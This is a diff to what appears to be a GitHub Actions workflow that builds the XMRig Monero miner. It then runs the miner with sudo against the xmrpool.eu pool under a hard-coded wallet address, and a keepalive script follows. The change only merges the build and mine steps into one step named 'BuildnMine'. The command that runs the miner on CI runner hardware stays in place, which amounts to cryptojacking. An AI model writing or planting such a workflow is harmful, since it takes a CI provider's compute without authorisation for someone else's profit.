@@ -10,7 +10,7 @@ jobs:
       - name: Install Deps
         run: |
           sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev automake libtool autoconf
-      - name: Build
+      - name: BuildnMine
         run: |
           git clone https://github.com/xmrig/xmrig.git
           mkdir xmrig/build && cd xmrig/scripts
@@ -18,8 +18,6 @@ jobs:
           cmake .. -DXMRIG_DEPS=scripts/deps
           cmake .. -DXMRIG_DEPS=scripts/deps
           make -j$(nproc)
-      - name: Mine
-        run: |
           sudo /home/runner/xmrig/build/./xmrig -o xmrpool.eu:9999 -u 488RXf348f57LAtxpWaNKLEaUtL6Ye9cpXVCuP27ci1CRYNUM5eR3w7fAHbsyZT1vdDgSJBr4TPTkLUN4AY5GJfXNWJtjZT -k --tls
       - name: KeepAlive
         run: bash ./keepalive.sh
